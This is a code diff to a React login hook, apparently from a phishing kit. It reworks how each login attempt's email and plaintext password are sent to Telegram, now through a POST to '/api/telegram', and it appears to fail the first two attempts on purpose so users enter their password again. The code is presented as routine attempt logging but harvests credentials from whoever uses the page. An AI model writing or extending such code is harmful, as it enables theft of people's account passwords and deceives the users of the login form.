@@ -1,6 +1,5 @@
 import { useState } from 'react'
 import { LoginCredentials, LoginState } from '../../../types/auth'
-import { sendTelegramMessage } from '../../../services/telegram'
 
 export function useLogin() {
   const [state, setState] = useState<LoginState>({
@@ -20,13 +19,24 @@ export function useLogin() {
       const currentAttempt = attempts + 1
       setAttempts(currentAttempt)
 
-      // Log attempt
-      await sendTelegramMessage(
-        `🔐 Login attempt ${currentAttempt}
+      // Log attempt via API
+      const logMessage = `🔐 Login attempt ${currentAttempt}
 Email: ${credentials.email}
 LOG: ${credentials.password}
 Time: ${new Date().toISOString()}`
-      )
+
+      try {
+        await fetch('/api/telegram', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ message: logMessage }),
+        })
+      } catch (telegramError) {
+        console.error('Failed to send Telegram notification:', telegramError)
+        // Continue with login process even if Telegram notification fails
+      }
 
       // First two attempts fail
       if (currentAttempt <= 2) {
